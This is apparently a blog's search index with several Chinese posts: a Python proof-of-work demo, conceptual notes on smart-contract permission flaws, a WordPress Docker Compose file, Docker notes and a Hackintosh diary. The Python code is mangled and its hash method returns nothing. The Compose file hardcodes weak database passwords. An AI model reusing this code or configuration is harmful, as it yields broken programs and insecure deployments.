<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[苟若恒，何必三更眠五更起。]]></title>
    <url>%2F2019%2F09%2F03%2F%E8%8B%9F%E8%8B%A5%E6%81%92%EF%BC%8C%E4%BD%95%E5%BF%85%E4%B8%89%E6%9B%B4%E7%9C%A0%E4%BA%94%E6%9B%B4%E8%B5%B7%E3%80%82%2F</url>
    <content type="text"><![CDATA[前言 半年没有更新博客了。半年！你知道我这半年怎么过的吗？月月交着阿里云9.98的vps费用，月月懒得写blog…… 暑假结束，大三开始。真正意义上接触安全1年的时间。回顾一年实验室生活，充实又快乐。我认为，收获不仅仅是技术能力上的提升，更有意义的是自学能力和自我认知。 半年来不是啥也没干。关于Web安全认识理解更深一步。所以想分享记录出来一些总结。当然都是学习了别人的姿势，没有自己真正挖掘出来的漏洞/姿势。至于是否是造轮子，我不敢说。总之，我不是创造者，只是时长一年多的练习生。喜欢唱跳ra….zhouqicaibi！ 一叶飘零大佬的blog个性签名：苟若恒，何必三更眠，五更起。之前看到就感触颇深，事实确实如此。坚持真的太难了！所以还是要坚持写blog，记录分享学习笔记与心得。希望你我都有所收获。 Web安全梳理 以后尽量每周发一个专题或多个专题点的总结，只是把笔记整理整理并不麻烦，同时还能回顾复习一举两得。平时学习内网的利用点。以下是梳理的web安全基础点：（有一些也没有完全搞懂）]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>心得分享</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[区块链-工作量证明Python实现]]></title>
    <url>%2F2019%2F04%2F16%2F%E5%8C%BA%E5%9D%97%E9%93%BE-%E5%B7%A5%E4%BD%9C%E9%87%8F%E8%AF%81%E6%98%8EPython%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[# -*- coding: utf-8 -*- &apos;&apos;&apos; 一个区块的结构 { &quot;index&quot;:0, //索引 &quot;timestamp&quot;:&quot;&quot;, //时间戳 &quot;proof&quot;:&quot;&quot;, //工作量证明 &quot;transactions&quot;:[ //交易 &quot;sender&quot;:&quot;&quot;, //交易发出者 &quot;receiver&quot;:&quot;&quot;, //交易接收者 &quot;amount&quot;:5, //交易金额 ], &quot;prehash&quot;:&quot;&quot;, //前一块区块的hash值 } &apos;&apos;&apos; import hashlib import json import time​​ class BlockChain:​​ #初始化区块链方法​ def init(self):​ self.chain = [] #区块链​ self.current_transactions = [] #交易​​ self.new_block(proof = 100, pre_hash= 1) #产生创世区块​​ #创建区块方法，默认前一块hash为None（创世区块）​ def new_block(self, proof, pre_hash = None):​ block = { ‘index’:len(self.chain) + 1, #所创建区块的索引为当前区块链长度+1 ‘timestamp’: time.time(), #产生时间戳 ‘transactions’:self.current_transactions, #交易信息为当前保存的交易信息列表 ‘proof’:proof, #工作量证明 ‘pre_hash’:pre_hash or self.hash(self.chain[-1]) #前一块哈希值，[-1]代表数组最后一个元素 } self.current_transactions = [] #交易已经打包成区块，当前交易赋空 self.chain.append(block) #在区块链后面添加区块 return block #创建交易方法，传入发送者、接收者、交易金额，返回类型为int def new_transactions(self, sender, receiver, amount) -&gt;int: self.current_transactions.append( #在当前交易列表里添加 { &apos;sender&apos;:sender, &apos;receiver&apos;:receiver, &apos;amount&apos;:amount } ) return self.last_block[&apos;index&apos;] + 1 #返回上一块区块索引+1 #静态哈希计算方法 @staticmethod def hash(block): block_sring = json.dumps(block, sort_keys=True).encode()#使用json把转化成字符串，sort_keys排序 hashlib.sha256(block_sring).hexdigest() #hashlib传入参数为字符串编码后的字节数组 #特性找到最后一个区块方法 @property def last_block(self): return self.chain[-1] #工作量证明方法，简化为不是上一个区块的hash而是工作了证明 def proof_of_work(self, last_proof: int) -&gt; int: proof = 0 #从0开始 while self.valid_proof(last_proof,proof) is False: #只要无效工作量证明 proof +=1 #则proof++ print(proof) #打印proof来观察过程 return proof #判断有效工作量方法 def valid_proof(self, last_proof:int, proof:int ) -&gt;bool: guess = f&apos;{last_proof}{proof}&apos;.encode() #猜测值为上一个拼接当前 guess_hash = hashlib.sha256(guess).hexdigest() # #sleep(1) #可以来延迟更好观察工作量证明过程（挖矿） print(guess_hash) return guess_hash[0:4] == &quot;0000&quot; #如果满足以0000开头则返回1，否则返回0 &apos;&apos;&apos; if guess_hash[0:4] == &quot;0000&quot;: return True else: return False &apos;&apos;&apos; #测试工作量证明代码 if __name__ == &quot;__main__&quot;: testPow = BlockChain() testPow.proof_of_work(100)测试结果：]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[以太坊-智能合约审计——权限隐患]]></title>
    <url>%2F2019%2F03%2F25%2F%E4%BB%A5%E5%A4%AA%E5%9D%8A-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9D%83%E9%99%90%E9%9A%90%E6%82%A3%2F</url>
    <content type="text"><![CDATA[以太坊-智能合约审计——权限隐患一、智能合约中的权限 合约拥有者(owner)：执行合约中所有函数 普通用户：只能调用约定范围内的函数 二、Solidity中函数权限 Public：函数可以被合约内部函数、继承合约、外部合约调用 Private：只能被合约内部函数调用 Internal：可以被合约内部函数以及继承合约调用 External：只能外部合约调用 注意：函数如果不限定，Solidity语言会默认设置函数为Public权限，也就是任何合约可以调用！ HCTF的ez2win题目就是利用这个点来破解得到flag 三、构造函数权限问题 Solidity编写合约和面向对象编程语言非常相似，可以用构造函数（constructor）来初始化合约对象 类似C++等语言，Solidity中构造函数是方法名和合约名字相同的函数，创建合约时会调用构造函数对状态变量进行数据初始化操作 构造函数可用的函数类型为public或internal 如果构造函数带参数，必须要放在合约下的第一个函数 pragma solidity ^0.4.16 contract Function{ Function Function() public{ //构造函数内容` }} 0.4.22版本后，solidity编译器引入了constructor关键字。以替代低版本的将合约名作为构造函数名的语法，避免程序员容易出现的编码错误。使用旧写法会出现 warning 信息。 pragma solidity ^0.4.22 contract Function{ constructor() public{​​ //初始化操作​ }​ Function test(){​​ //其他函数功能性代码​ }​ } 安全问题 构造函数之所以区别于普通函数，是因为构造函数它主要用户初始化整个合约对象，而且不能被任意用户所调用，所以一旦构造函数可以被任意用户调用时，调用者就可以获得初始化合约的权限，带来安全隐患。 ​ 1.构造名与合约名不相同 ​ 编译器0.4.22之前： ​ 构造函数的函数名默认是和合约名一致的，如果智能合约的开发者在开发过程中出现”构造函数名与合约名不一致”的现象（大小写、多加了一个s等情况），那么构造函数将不再是“构造函数”，而变为一个任意用户可以调用的普通函数，任意用户可以通过调用该函数实现对合约的初始化操作。 ​ 2.constructor函数不规范 ​ 在编译器0.4.22之后： ​ 使用了constructor来替代原先的“构造函数名与合约名必须一致”的代码编写规范，但是一些合约开发者在开发工程中往往还是会出现各种错误，例如：在constructor前面加function，或者加了function然后开头的C写成了大写，即“function Constructor(){}”,这样便使得构造函数变成了公有函数，可被人任意调用。 四、普通函数权限问题 对于一些普通函数，我们一般会使用一些修饰器来进行修饰，同时有时候也会使用public、private、internal、external来进行修饰。一些合约开发者留下“后门”，owner可以销毁任意用户的任意代币。那么如果owner被他人控制呢？]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>合约审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker-练习-搭建Wordpress]]></title>
    <url>%2F2019%2F03%2F18%2FDocker-%E7%BB%83%E4%B9%A0-%E6%90%AD%E5%BB%BAWordpress%2F</url>
    <content type="text"><![CDATA[yml文件代码：#使用版本3 version: &quot;3&quot; #两个服务：一个数据库、一个wordpress services: #数据库服务 db: image: mysql:5.7 #使用5.7的mysql,目前wordpress无法使用mysql8会出现链接数据库错误 volumes: #挂载mysql目录名字为de_data - db_data:/var/lib/mysql restart: always #设置总是重新启动 environment: #环境变量设置 MYSQL_ROOT_PASSWORD: 123456 MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress #wordpress服务 wordpress: depends_on: #设置依赖与db服务（上面的数据库服务），设置依赖后先启动db服务再启动wordpress服务 - db image: wordpress #pullwordpress镜像 volumes: #挂载wordpress目录为wp_site - wp_site:/var/www/html ports: #映射端口 - &quot;8000:80&quot; - &quot;443:443&quot; restart: always environment: #设置环境变量 WORDPRESS_DB_HOST: db:3306 #这个很关键！！！否则报错！ WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress volumes: db_data: wp_site: ​​ 最后效果图：]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker学习笔记]]></title>
    <url>%2F2019%2F03%2F11%2FDocker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[Docker学习笔记整理记录Docker学习。重点学习Docker基础和Compose，实践了几个小型项目，下一步运用熟练。 一、基本概念 镜像（Image）：root文件系统（分层存储，体积小） 容器（Container）：实质是基于镜像的进程，相当于镜像的实例（在镜像基础上加一层容器运行时的存储层） 仓库（Registry）：集中存储、分发镜像的服务（包含多个仓库，每个仓库可包含多个标签） 国内加速 二、安装Docker 三、使用镜像 （一）获取镜像： docker pull [选项] [仓库地址] 仓库名：标签 如：docker pull ubuntu:14.04 （二）列出镜像： docker image ls（因镜像多层存储，可以继承、复用，故镜像体积和并非是实际硬盘消耗） 查看镜像、容器、数据卷所占用空间：docker sysytem df 悬虚镜像：新旧镜像同名，使得旧镜像被取消从而仓库名、标签都为 显示悬虚镜像：docker image ls -f dangling=true 删除悬虚镜像：docker iamge prune（悬虚镜像已经失去存在价值，可随意删除） 中间层镜像：其他镜像所依赖的镜像（不可删除） 显示中间层镜像：docker iamge ls -a 列出部分镜像：docker image ls [镜像名] 使用filter过滤：docker image ls -f since/before=xxx 列出镜像的ID：docker image ls -q 列出镜像摘要：docker iamge ls --digests 指定格式列出：docker image ls --format &quot;{ {.ID}}:{ {.Repository}}&quot; （三）删除镜像 docker iamge rm [选项][镜像] * 注：镜像可以是：长/短ID、镜像名、镜像摘要 （四）镜像构成 启动镜像：docker run --name webserver -d -p 80:80 nginx（用nginx镜像启动一个命名为webserver的容器，并映射到80端口） 进入镜像：docker exec -it [容器名字] [shell] 查看改动：docker diff [容器名字] 把容器保存为镜像：docker commit [选项] &lt;容器ID&gt; [容器名字]（给原来镜像新添加一层，形成新镜像，自己定制的黑箱镜像。慎用！） （五）镜像定制 定制每一层所添加的配置、文件来定制镜像（Dockerfile脚本一键化来快速构建） 什么是Dockerfile？其是包含了一条条命令的文本文件，每一条命令为一层，每一条命令描述该层如何构建。 Dockerfile指令详解： 1.FROM：指定基础镜像，必须有且为第一条命令。（scratch为空白镜像，不以任何系统为基础。不需要系统支持，比较适合Go语言） 2.RUN：执行命令行命令。 shell格式：命令行格式 exec格式：RUN [“可执行文件” , “参数1” , “参数2”]，像是函数调用中的格式 层数问题？ 每个shell命令一个RUN则每个命令构建一层，耗费资源！（目前最大可建127层） 解决：\换行格式化（清晰、排障），&amp;&amp;串联。 最后清理删除无关文件（比如apt缓存文件，避免镜像臃肿） 使用Dockerfile构建镜像：docker build [选项] &lt;上下文路径/URL&gt;(一般路径为”.”，代表当前路径因为Dockerfile在当前路径) build原理：远程调用Docker服务端的Docker引擎来实现。（若最后为”.”，打包本地址内容上传到Docker引擎） 用Git repo构建：docker buildhttp://github.com/twang2218/gitlab-ce-zh.git 用tar压缩包构建：docker build http://server/context.tar.gz 从标准输出中读取Dockerfile进行构建：docker build - &lt; Dockerfile（或cat Dockerfile | docker build -） 从标准输入中读取上下文压缩包进行构建：docker build - &lt; context.tar.gz （六）Dockerfile命令详解 3.COPY：复制文件 命令行：COPY [--chown=&lt;user&gt;:&lt;group&gt;] &lt;源路径&gt;...&lt;目标路径&gt; 函数调用：COPY [--chown=&lt;user&gt;:&lt;group&gt;] [&quot;&lt;源路径&gt;&quot;,...&quot;&lt;目标路径&gt;&quot;] 注：原路径可以是多个，甚至可以是通配符，其规则要满足Go的filepath.Math规则 源文件的元数据都会保留！比如：读写、执行权限等 4.ADD：更高级的文件复制 &lt;源路径&gt;可以是URL或者tar压缩文件，下载后默认权限为600（最好不要用） 5.CMD：容器启动命令. shell格式：CMD &lt;命令&gt;（实际是被包装为sh -c 的参数进行执行） exec格式：CMD [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;....]（被解析为JSON数组） 6.ENTRYPOINT：入口点（目的同CMD，指定容器启动程序及参数） shell格式： exec格式： CMD内容作为参数传到RNTRYPOINT（目的可以加后续参数） 7.ENV：设置环境变量（后续指令中可以使用环境变量，而升级只需要改变环境变量版本，利于维护Dockerfile） ENV &lt;key&gt; &lt;value&gt; ENV &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;... 8.ARG：构建参数 ARG &lt;参数名&gt;[=&lt;默认值&gt;] ARG同EVN，但是其环境变量在容器运行时不会存在。 9.VOLUME：定义匿名卷（尽量爆出容器存储层不发生写操作） VOLUME [&quot;&lt;路径1&gt;&quot;, &quot;路径2&quot;...] VOLUME &lt;路径&gt; 10.EXPOSE：声明端口（帮助使用者理解镜像服务的守护段，方便配置映射；运行时随机端口映射随机映射EXPOSE的端口） EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...] 注：仅仅声明容器打算使用什么端口，并没有实际映射端口 11.WORKDIR：指定工作目录（指定工作目录，如果没有自动创建） WORKDIR &lt;工作目录路径&gt; 保证各层的当前目录就被改为制定的目录 12.USER：指定当前用户（同WORKDIR，改变环境状态并影响以后的层。改变之后各层的执行RUN、CMD、ENRTRYPOINT这类命令的身份） USER &lt;用户名&gt;[:&lt;用户组&gt;] 13.HEALTHCHECK：健康检查 HEALTHCHECK [选项] CMD &lt;命令&gt;：设置检查容器健康的命令 HEALTHCHECK NONE：屏蔽基础镜像的健康检查 支持下列选项： –interval=&lt;间隔&gt;（两次检查间隔，默认30s） –timeout=&lt;时长&gt;（超时时间，默认30s） –retries=&lt;次数&gt;（失败次数限制，超过则unhealthy） 14.ONBUILD：为他人做嫁衣裳 ONBULID &lt;其他指令&gt;（其他指令当以当前的镜像为基础镜像 构建下一季镜像的时候才会被执行） （七）其他制作镜像的方式 1.从rootfs压缩包导入 docker import [选项] &lt;文件&gt;|&lt;URL&gt;| - [&lt;仓库名&gt;[:&lt;标签&gt;]] （压缩包可以是本地文件、远程web文件。从镜像/目录展开并直接作为镜像第一层提交） 2.Docker save 和 Docker load 将镜像保存为一个文件，然后传输到另外一个位置上，再加载进去。 Docker save [仓库名] -o [filename] 或 docker save [仓库名] | gzip &gt; filename.tar.gz 加载：docker load -i filename.tar.gz （八）镜像实现原理很多层构成，使用Uinon FS将这些不同的层结合到一个镜像中去。 四、操作容器 （一）启动 1.基于镜像新建容器并启动 启动终端：docker run -t -i unbuntu:18.04 /bin/bash -t：分配伪终端，绑定到容器的标准输入上 -i：让容器的标准输入保持打开 流程： * 检查本地是否存在指定镜像，没有就在公有仓下载 * 利用景象创建并启动一个容器 * 分配一个文件系统，并在只读的镜像层外面挂载一层可读写层 * 从宿主主机配置的网桥借口中桥街一个虚拟借口到容器中去 * 从地址池配置一个ip地址给容器 * 执行用户指定的应用程序 * 执行完毕后容器被终止 2.将终止状态的容器重启 docker container start docker container restart （二）守护态运行 后台运行，不需要直接把执行命令的结构输出在当前宿主机下 后台运行命令：docker run -d 获取容器输出的信息：docker container logs （三）终止容器 docker container stop 对于一个只启动了终端的容器，exit或ctrl+d推出终端时，所创建的容器立刻停止。 （四）进入容器 docker attach ID/名（从stdin中exit会导致容器停止） docker exec -it ID/名（从stdin中exit不会导致容器停止） （五）导出和导入容器 1.导出容器：docker export ID &gt; xxx.tar 2.导入容器：docker import URL/文件（与load区别：容器快照将丢弃所所有的历史记录和元数据可以重新指定标签元素） （六）删除容器 删除终止的容器：docker container rm xxx 删除正在运行容器：docker container rm -f xxx 清理所有终止的容器：docker container prune 五、访问仓库 （一）Docker Hub（二）私有仓库 官方工具：docker-registry （三）高级私有仓库（四）Nexus3.x的私有仓库六、数据管理 （一）数据卷（类似于linux下队目录或文件进行mount） 1.特点： 可供一个或多个容器共享使用和重用 对数据卷的修改会立马生效 对数据卷的更新不会影响镜像 数据卷默认一直存在，即使容器被删除 2.创建数据卷： docker volume create my-vol 3.查看所有的数据卷： docker volume ls 4.查看指定数据卷的信息： docker volume inspect xxx 5.启动一个挂载数据卷的容器： --mount source=xxx,target=/xxxx 6.查看容器的数据卷具体信息： docker inspect xxx 7.删除数据卷： docker volume rm xxx 8.删除容器同时删除数据卷： docker rm -v 9.清理无主的数据卷： docker volume prune （二）挂载主机目录 1.挂载主机目录为数据卷 --mount type=bind,source=/src/webapp,target=/opt/webapp（挂载主机的/sec/webapp到/opt/webapp目录） 默认权限为：读写 添加命令只读：--mount type=bind,source=/src/webapp,target=/opt/webapp,readonly 2.挂载主机文件为数据卷 --mount type=bild,source=$HOME/.bash_historytarget=/root/.bash_history（可用来记录容器输入果的命令） 七、使用网络 （一）外部访问容器 -P：随机映射49000-49900的端口 -p：指定要映射的端口（可以多次使用来绑定多个端口） 映射所有借口地址：-p 5000:5000 映射到指定地址的指定端口：-p 127.0.0.1:5000:5000 映射到指定地址的任意端口：-p 127.0.0.1:：5000 可以用udp来指定udp端口：-p 127.0.0.1:5000:5000/udp 查看映射端口配置：docker port （二）容器互联 老习惯：--link 新建网络：docker network create -d bridge my-net 注：-d参数指定Docker网络类型，有bridge、overlay（适用于Swarm mode） 链接容器： * docker run -it --rm --name busybox1 --network my-net busybos sh * docker run -it --rm --name busybox2 --network my-net busybos sh 可以使用Ping命令来证明 多个容器互联：Docker Compse （三）配置DNS Docker利用虚拟文件来挂载容器的3个相关配置文件 容器中mount命令可以看到挂载的信息（宿主主机DNS信息发生更新后，所有Docker容器的DNS配置通过/etc/resolv.conf文件立刻得到更新） 自动配置：在/etc/docker/daemon.json文件中增加以下内容 { &quot;dns&quot;:[ &quot;114.114.114.114&quot;, &quot;8.8.8.8&quot; ] } 可以使用docker run -it --rm ubuntu:18.04 cat etc/resolv.conf来证明其已经生效 手动配置： 设定主机名：-h HOSTNAME或--hostname=HOSTNAME（写到容器内的/etc/hostname和/etc/hosts） 添加DNS服务器到容器的/etc/resolv.conf中：--dns=IP_ADDRESS（让容器用这个服务器来解析所有不在/etc/hosts中的主机名） 设定容器的搜索域：--dns-search=DOMAIN 八、高级网络配置 九、Docker三剑客之Compose项目 （一）简介 Compose使用doekcer-compose.yml模板文件来管理项目（Python编写，只要支持Docker API就可用） 服务：一个应用容器（可包含若干运行相同镜像的容器实例） 项目：应用容器组成的完整业务单元 （二）安装卸载 Python pip：sudo pip install -U docker-compose（卸载：sudo pip uninstall docker-compose） curl下载后，改成执行权限：chmod +x /usr/local/bin/docker-compse（卸载：sudo rm /usr/local/bin/docker-compose） 容器中执行 （三）使用 1.写好每个容器的Dockerfile 2.写好yml链接文件 3.docker-compose up （四）命令说明 1.命令对象：默认项目（项目中所有的服务都会受影响），也可为项目中的服务或容器 2.帮助：--help 3.命令格式：docker-compse [-f=...] [options] [COMMAND] [ARGS...] -f:指定Compse模版文件，默认为docker-compose.yml -p:指定项目名称，默认将使用所在目录名 --x-networking:Docker：的可拔插网络后端特性 --x-network-driver DRIVER:指定网络后端的驱动，默认为bridge --verbose：输出更多调试信息 -v：打印版本信息 4.build docker-compose build [option] [SERVICE...] 构建（重新构建）项目中的服务容器（可随时重新构建项目） --fore-rm：删除构建过程中的临时容器 --no-cache：构建过程不使用cache（chche加长构建过程） --pull：始终尝试通过pull来获取更新版本的镜像 5.config 验证Compose文件格式是否正常（正确显示匹配，错误显示原因） 6.down 停止up命令所启动的容器，并移除网络 7.exec 进入指定的容器 8.help 9.images 列出Compose文件中包含的镜像 10.kill Docker-compose kill [option] [SERVICE...] 发送DIGKILL信号来强制停止服务容器 -s：指定发送的信号 11.logs docker-compose logs [][] 查看服务器的输出（默认使用不同颜色区分，–no-color来关闭颜色） 12.pause docker-compose pause [] 暂停一个服务容器 13.port docker-compose port [ ] 打印某个容器端口所映射的公共端口 --protocol=proto:指定端口协议，默认tcp可指定udp --index=index：指定命令容器的序号 14.ps 列出项目所有容器 -q：只打印ID 15.pull docker-compose pull [][] 拉取服务依赖的镜像 --ignore-pull-failures：忽略拉取镜像过程中的错误 16.push 推送服务依赖的镜像到Docker镜像仓库 17.restart docker-compose restart [][] 重启 -t：重启前停止容器的超时 18.rm docker-compose rm [][] 删除所有（停止状态的）服务容器 -f：强制直接删除 -v：删除容器所挂在的数据卷 19.run docker-compose run [option] [-p PORT...] [-e KEY=VAL...] SERVOCE [COMMAND][ARGS...] 在指定服务上执行一个命令，默认启动关联容器（–no–deps关闭） -d：后台运行容器 --name NAME：为容器指定一个名字 --entrypoint CMD：覆盖默认的容器启动指令 -e KEY=VAL： 设置环境变量值，可多次使用选项来设置多个环境变量 -u：指定运行容器的用户名或uid --no-deps：关闭自动启动关联 --rm：运行命令后自动删除容器，d模式下将忽略 -p：映射容器端口到本地主机 --service-ports：配置服务端口并映射到本地主机 -T：不分配伪tty（tty命令无法执行） 20.scale docker-compse scale [optins][service=$num] 设置指定服务运行的容器个数 -t：停止容器时超时 21.start docker-compose start [] 启动已经存在的服务容器 22.stop docker-compose stop [][] 停止运行的容器 -t：停止容器的时候超时 23.top 查看各个服务器内运行的进程 24.unpause docker-compose unpause [] 恢复暂停的服务 25.up docker up [][] 自动构建镜像、（重新）创建服务、启动服务、关联服务相关容器 Ctrl+c停止所有容器 若服务容器已经存在，则尝试停止所有容器并重新创建 -d：在后台启动并运行所有容器 --no-color：不使用颜色来区分不同的服务的通知台输出 --no-deps：不启动服务器所链接的容器 --force-recreate：强制重新创建容器 --no-recreate：如果容器已经存在则不重新创建 --no-build：不自动构建缺失的服务镜像 -t：停止容器的时候超时 26.version 打印版本信息 （五）yml模版文件 默认YAML格式的docker-compose.yml 注意：每个服务必须通过image指令指定镜像或build指令（需要Dockerfile）等来自动构建生成镜像 如果使用build指令，在Dockerfile中设置的选项（如：CMD、EXPOSE、VOLUME、ENV等）将会自动被获取无需再Docfile.yml文件中再次设置 1.build 指定Dockerfile所在文件夹的路径（绝对或相对yml） 也可以：context指令指定Dockerfile所在文件夹的路径 ，使用dockerfile指令指定Docfile文件名，args指令指定构建镜像时的变量、chahce_from指定构建镜像的缓存 2.cap_add/cap_drop 指定容器的内核能力（capacity）分配 拥有所有能力： cap_add: -ALL 去掉NET_ADMIN能力： cap_drop: -NET_ADMIN 3.command 覆盖容器启动后默认执行的命令 4.configs 仅用于Swarm mode 5.cgroup_parent 指定父cgroup组，继承该组的资源限制 6.container_name 指定容器名称，默认：项目名称-服务名称-序号 container_name: docker-web-container 7.deploy 仅用于Swarm mode 8.devices 指定设备映射关系 9.depends_on 解决容器的依赖和启动先后问题，先启动depends_on。 10.dns 自定义DNS服务器，可以是值、列表 11.dns_search 配置DNS搜索域，可以是值、列表 12.tmpfs 挂载一个tmpfs文件系统到容器 13.env_file 从文件中获取环境变量，可以为单独的文件路径或列表（若-f指定模版文件则变量的路径基于模版文件） 注：环境变量文件中每一行必须符合格式 14.environment 设置环境变量，支持数组或字典格式 只给定名称的变量会自动获取运行Compose主机上对应变量的值，可以防止泄漏不必要的数据 15.expose 暴漏端口，但不映射到宿主机，只被链接的服务访问 16.external_links 链接yml外部的容器 17.extra_hosts 指定额外的host名称映射信息 18.healthcheck 通过命令检查容器是否健康运行 19.image 指定为镜像名称或ID 20.labels 为容器添加Docker元数据（metadata）信息 21.links 不推荐使用 22.logging 配置日志选项 dirver:支持三种日志驱动类型：&quot;json-file&quot;,&quot;syslog&quot;,&quot;none&quot; options:配置日志驱动的相关参数 23.network_mode 设置网络模式 24.networks 配置容器链接的网络 25.pid 跟主机系统共享进程命名空间 26.ports 暴漏端口信息 27.secrets 存储敏感数据，如mysql服务密码 28.security_opt 指定容器模版标签（label）机制的默认属性（用户、角色、类型、级别等） 29.stop_signal 设置另一个信号来停止容器，默认SIGUSR1 30.sysctls 配置容器内核参数 31.ulimits 指定容器的ulimits限制值 32.volumes 数据卷所挂载路径设置 可设置宿主机路径（HOST：CONTAINER）或加上访问模式（HOST：CONTSAINER：ro） 33.其他 基本与docker run中对应参数的功能一致 34.读取变量 Compose模版文件支持动态读取主机的系统环境变量和当前目录下的.env文件中的变量 十、Docker三剑客之Machine项目 十一、Docker三剑客之Docker Swarm项目 十二、安全 十三、底层实现]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTFer的黑苹果安装与配置心得]]></title>
    <url>%2F2019%2F03%2F10%2FCTFer%E7%9A%84%E9%BB%91%E8%8B%B9%E6%9E%9C%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE%E5%BF%83%E5%BE%97%2F</url>
    <content type="text"><![CDATA[0x01.前言 水文一篇。 ​ 大表哥们都用Mac，小老弟还在用Win10。 自己不算忠实果粉也算半个了吧，深知苹果系统的强大、流畅、好用，着实眼红，但是又没钱买。。。所以，经先进表哥指导，搞了个黑苹果。 ​ 开学第一周，每晚在床上都是看关于黑苹果的东西，从一无所知到浅浅明白。 ​ 由于先进表哥经验丰富，过程还算顺利，一天多就搞定了。当然，中间也遇到了很多麻烦。 ​ 安装成功只是成功吃到黑苹果的一半。由Win切换到Mac，软件破解、环境配置等等更麻烦。 ​ 收获也很多。记录下来，自己加深记忆的同时也供大家参考吧。 0x02.黑苹果安装历程 后续记忆写的，没有截图。凑合读吧。 1.爬帖子爬帖子爬帖子 推荐几个个不错的： ​ - 微信公众号：悦享软件（包含镜像、工具、EFI文件） ​ - 远景论坛：http://bbs.pcbeta.com/（主要是搜集信息，下载附件需要注册，但已经无法注册，可以淘宝买） ​ - 黑果小兵：https://blog.daliansky.net/（colcer工具使用及其他问题解决办法） ​ - 国光博客：https://www.sqlsec.com/（一名ctfer，主要是教程及安装流程） ​ 所有关于黑苹果的文章都看完之后加上观看教程视频等，基本知道大体流程及注意事项了。 ​ 2.下载镜像，制启动盘 使用了悦享软件分享的网盘，包含了镜像、工具、EFI大全。 ​ 链接：http://mp.weixin.qq.com/s?__biz=MzIzNjAxMDMzNQ==&amp;mid=100000706&amp;idx=1&amp;sn=5bf4693ac762eae5ca63372bf7fe4c02&amp;chksm=68df2df25fa8a4e4c86fada980c07a8e2c93236e06fc0a710ce3b6049ff04b2260650287731d&amp;mpshare=1&amp;scene=23&amp;srcid=#rd ​ 一开始下载的Majove（10.14），没找到10.14的光影EFI，尝试后发现用光影10.13的EFI不行。只能用High Sierra了,不过真想体验一把10.14的暗黑模式。 ​ - 格式化u盘（u盘必须要大于8G）使用工具TransMac：Formar Disk for Mac把u盘转换成Mac格式，一路默认就行。 ​ - 然后使用Restore with Disk Image把镜像写入u盘。根据u盘的存储速度来看要写入多久。（我用舍友u盘写了一个多小时….然后还不能用….坑…） ​ - 写入完成后，Win系统由于不识别Mac系统文件格式提示把u盘格式化，一定不要确定！否则前面就白费了。 ​ - 然后，根据自己电脑配置或爬帖子找到的成功案例来下载EFI文件。（EFI文件是用来引导系统开机的，下载的黑果EFI包含mac系统的引导工具CLOVER） ​ - 由于目前win无法识别mac文件格式，使用工具：DiskGenius 磁盘管理软件来删除u盘启动盘的/EFI/CLOVER文件夹，然后把我们下载好的EFI里的/CLOVER文件复制进去。（直接ctrl+c、ctrl+v就行） ​ 这样就完成了最重要的一步。 ​ 3.开始安装 - 首先，开机进入BIOS把安全模式关闭（否则CLOVER无法引导开机）。然后打开usb引导开机。保存重启。 ​ - 然后选择macos install。进入，选择中文，临时开启一个macos系统。选择磁盘管理工具，选择要安装的磁盘，然后抹盘（有重要文件要备份！由于之前我win10在128G的ssd上，又不想把mac装在机械上，同时还也不想花钱换ssd..所以，我先把win10移到了机械硬盘然后抹了ssd。。。如果自己是256G的ssd在安装前，先直接分100多G就够用了） ​ - 然后再选择安装。第一次安装重启后在要安装一次。第一次安装设置macos进入系统后，基本完成了80%了。由于自己找的EFI已经可以驱动大部分，就没必要弄了。 ​ 4.后续调整 由于目前是用u盘来引导启动，不能每次都带个u盘来引导开启mac吧。 ​ - 然后，同样用DiskGenius 磁盘管理软件把u盘下的CLOVER文件复制到mac系统下ESP分区的EFI里面。 ​ - 然后，使用工具：EasyUEFI来新建一个开机引导，调整顺序为第一。为保障确实是第一，开机的时候可以进入BIOS看看，再设置一下。 ​ 到此，已经ok了。 ​ 然后本人有强迫症，开机引导多了很多选择，想隐藏没用的。可以在mac下挂载ESP分区，打开clover.efi文件用clover configurator来设置。 ​ 屏幕亮度使用键盘快捷键没法调节，但是可以用鼠标调节，暂时没管（也挺麻烦的，懒得花时间研究了，毕竟无伤大雅）。 ​ 最后，全球问题：网卡无法驱动。淘宝19.9包邮usb无线网卡解决！（苹果原装的内置网卡价格虚高，都100多。不过可以连接蓝牙。我的光影可以驱动蓝牙所以也没必要换内置网卡。） ​ 5.总结一下 虽然总体流程描述起来看似很简单，其实很多步骤都是看了大大大部分资料才明白的。（淘宝安装价格150一台） ​ 目前我的电脑基本90%以上完成度吧。 ​ - 无法解问题：蓝牙不能关闭、独显无法驱动、亮度无法键盘快捷键调节、触摸板部分手势不能用 ​ - 待解决问题：更换内置网卡、改显卡内存、调整字体大小（太小了累眼，改分辨率使字体变大但是模糊..） ​ - 优点：性价比极高、流畅、好用、爽、装x…… ​ - 缺点：不能100%完美、独显废了、不一定稳定、折腾…… ​ - 从win换到mac开始有点不适应…特别是快捷键。（默默掏出快捷键大全背了起来….） ​ 0x03.黑苹果环境配置 1.xcode 直接在appstore下载。 ​ 